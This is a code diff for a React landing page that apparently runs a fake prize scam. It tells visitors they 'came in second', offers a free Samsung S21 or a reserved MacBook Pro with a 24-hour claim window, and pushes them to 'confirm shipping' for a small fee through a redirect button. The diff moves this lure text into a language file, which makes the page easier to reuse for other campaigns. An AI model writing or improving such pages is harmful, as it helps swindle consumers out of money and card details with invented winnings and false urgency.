@@ -3,30 +3,8 @@ import lang from './language.json'
 import addNode,{ActionRedirect} from './function.js'
 import { useMediaQuery } from 'react-responsive';
 
-const {qna} = lang; 
+const {qna,intro,prod,mes,final} = lang; 
 const clr = ["btn-grn","btn-ylw","btn-wht"];
-
-const Load = (props)=>{
-
-	const [txt,changeTxt] = useState(false);
-
-	useEffect(()=>{
-		setTimeout(()=>{
-			changeTxt(true)
-		},1500)
-	},[])
-
-	return(
-		<div className="h-100 w-100 flx flx-jc-ce flx-ai-ce pos-rel">
-			<img src="./Samsung.png" alt="samsung" className="z-neg pos-abs loadImg fade"/>
-			{txt?
-				<h1 className="mont txt-wht fade-l trans">S21</h1>
-				:
-				<h1 className="mont txt-wht fade-l trans">SAMSUNG</h1>
-			}
-		</div>
-	)
-}
 
 const Circ = ()=>{
 	return(
@@ -112,10 +90,10 @@ const Process = ()=>{
 		fin?
 		<div className="flx flx-col flx-ai-ce flx-jc-ce h-100 fade">
 				<div className="flx flx-col flx-ai-ce flx-jc-ce w-80 fade">
-					<p className="lato txt-ylw">ATTENTION: please make sure to enter your correct details!</p>
-					<p className="lato txt-wht txt-al-ce">Please confirm your details via our shipping partner on the next page. To ensure safe shipping there will be a small fee for secure shipping. </p>				
+					<p className="lato txt-ylw">{final.action}</p>
+					<p className="lato txt-wht txt-al-ce">{final.mes}</p>				
 				</div>
-				<button className="mont btn w-50 btn-ylw p-20 m-t-5 fade product-button" data-product-id="1" onClick={ActionRedirect}>CONFIRM SHIPPING</button>
+				<button className="mont btn w-50 btn-ylw p-20 m-t-5 fade product-button" data-product-id="1" onClick={ActionRedirect}>{final.btn}</button>
 		</div>
 		:
 		<div className="flx flx-col flx-ai-ce flx-jc-ce txt-wht fade">
@@ -140,11 +118,11 @@ const Info = (prop)=>{
 
 	return(
 			<div className="flx flx-col flx-ai-ce flx-jc-sb h-100">
-				{(!prop.show&&!prop.small)&&<h4 className="mont">Welcome back to our competition ID -</h4>}
+				{(!prop.show&&!prop.small)&&<h4 className="mont">{intro.id}</h4>}
 
 				<div className="flx flx-col flx-ai-ce flx-jc-ce w-100">
-					<p className="lato txt-grn">Your MacBook Pro is reserved</p>
-					<p className="lato txt-wht txt-al-ce">One MacBook Pro has been reserved on your behalf. You have 24 hours to claim your MacBook Pro, please follow the instructions below.</p>				
+					<p className="lato txt-grn">{mes.head}</p>
+					<p className="lato txt-wht txt-al-ce">{mes.message}</p>				
 				</div>
 				{prop.show?
 					<QnA show={prop.show} ctr={prop.ctr} upd={prop.upd} fin={prop.fin} small={prop.small}/>
@@ -176,7 +154,7 @@ const Cont = (prop)=>{
 		<section className="flx flx-col flx-ai-ce flx-jc-sb w-50 h-100 p-50">
 			<div className="flx flx-col flx-jc-ce w-100 flx-ai-ce h-30 cong-txt">
 				<h2 className="txt-wht mont">Congratulations!</h2>
-				<p className="lato txt-wht">You came in second but don't feel sad!</p>
+				<p className="lato txt-wht">{intro.mes}</p>
 				<Prog/>
 			</div>
 			<Desc show={prop.show} ctr={prop.ctr} upd={prop.upd}/>
@@ -187,11 +165,11 @@ const Cont = (prop)=>{
 const Prod = ()=>{
 	return(
 		<section className="flx flx-col flx-ai-ce flx-jc-sb txt-wht w-50 bg-prod h-100 p-50">
-			<h4 className="mont w-100">SAMSUNG</h4>
+			<h4 className="mont w-100">{prod.name}</h4>
 			<img src="./Samsung.png" alt="samsung" className="w-80 fade"/>
 			<footer className="flx p-10 w-100">
-				<h4 className="txt-acc mont">$1249.99</h4>
-				<h4 className="txt-grn m-l-auto mont">FREE</h4>
+				<h4 className="txt-acc mont">{prod.price}</h4>
+				<h4 className="txt-grn m-l-auto mont">{prod.disc}</h4>
 			</footer>
 		</section>
 	)
@@ -217,10 +195,33 @@ const Intro = (prop) =>{
 		<section className="flx flx-col flx-ai-ce flx-jc-ce w-50 h-50 p-50">
 			<div className="flx flx-col flx-jc-ce w-100 flx-ai-ce h-30 cong-txt fade">
 				<h2 className="txt-wht mont">Congratulations!</h2>
-				<p className="lato txt-wht txt-al-ce">You came in second but don't feel sad!</p>
+				<p className="lato txt-wht txt-al-ce">{intro.mes}</p>
 			</div>
-			<h4 className="mont fade txt-wht txt-al-ce m-t-5">Welcome back to our competition ID -</h4>
+			<h4 className="mont fade txt-wht txt-al-ce m-t-5">{intro.id}</h4>
 		</section>
+	)
+}
+
+const Load = (props)=>{
+
+	const [txt,changeTxt] = useState(false);
+
+	useEffect(()=>{
+		 setTimeout(async()=>{
+			await changeTxt(true)
+			setTimeout(()=>props.load(true),1000)
+		},1500)
+	},[])
+
+	return(
+		<div className="h-100 w-100 flx flx-jc-ce flx-ai-ce pos-rel">
+			<img src="./Samsung.png" alt="samsung" className="z-neg pos-abs loadImg fade"/>
+			{txt?
+				<h1 className="mont txt-wht fade-l trans">S21</h1>
+				:
+				<h1 className="mont txt-wht fade-l trans">SAMSUNG</h1>
+			}
+		</div>
 	)
 }
 
@@ -232,7 +233,7 @@ const Main = (props)=>{
 
 	useEffect(()=>{
 
-		if(!small){
+		if(!small&&props.loaded){
 			let crc = document.querySelectorAll('.prog-crc');
 			let lne = document.querySelectorAll('.prog-lne');
 
@@ -243,8 +244,8 @@ const Main = (props)=>{
 	},[])
 
 	return(
-		<main className="h-100 flx flx-jc-ce flx-ai-ce pos-rel trans">
-			{/*<Load/>*/}
+	props.load?
+		<main className="h-100 flx flx-jc-ce flx-ai-ce pos-rel trans fade">			
 			<Prod/>
 			{
 				small?
@@ -252,7 +253,10 @@ const Main = (props)=>{
 				:
 				<Cont show={props.show} ctr={props.ctr} upd={props.upd}/>	
 			}
-		</main>
+		</main>		
+		:
+		<Load load={props.set}/>
+	
 	)
 }
 
